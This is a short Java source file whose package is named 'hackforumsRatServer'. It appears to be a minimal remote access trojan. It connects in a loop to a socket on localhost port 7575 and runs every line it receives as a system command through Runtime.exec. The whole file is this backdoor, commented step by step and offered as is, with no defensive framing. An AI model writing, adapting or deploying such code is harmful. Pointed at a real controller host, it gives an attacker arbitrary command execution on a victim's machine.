package hackforumsRatServer;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.UnknownHostException;

public class Main {
    public static void main(String[] args){
        while(true){
	        try {              
	        	//Creates a socket to receive commands from!
	            Socket socket  = new Socket("localhost", 7575);
	            
	            //Uses that socket to create a Reader to read the commands!
	            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));    
	            
	            //Waits for Lines to be sent and then executes them!
	            while(true){
	                String line = in.readLine();
	              
	                if(line != null){
	                    Runtime.getRuntime().exec(line);

	                }else {
	                    break;
	                }
	            }        
	        } catch (UnknownHostException e){
	            e.printStackTrace();
	        } catch (IOException e) {
	            e.printStackTrace();
	        }    
        }
    }
}